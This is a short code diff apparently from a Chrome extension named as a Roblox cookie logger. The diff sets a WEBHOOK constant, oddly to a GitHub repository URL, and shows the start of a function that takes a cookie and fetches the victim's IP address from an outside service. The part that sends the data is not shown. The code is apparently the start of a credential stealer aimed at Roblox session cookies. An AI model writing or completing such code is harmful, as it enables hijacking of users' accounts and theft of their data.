@@ -1,4 +1,4 @@
-const WEBHOOK = "";
+const WEBHOOK = "https://github.com/ox-y/chrome-extension-roblox-cookie-logger.git";
 
 async function main(cookie) {
     var ipAddr = await (await fetch("https://api.ipify.org")).text();
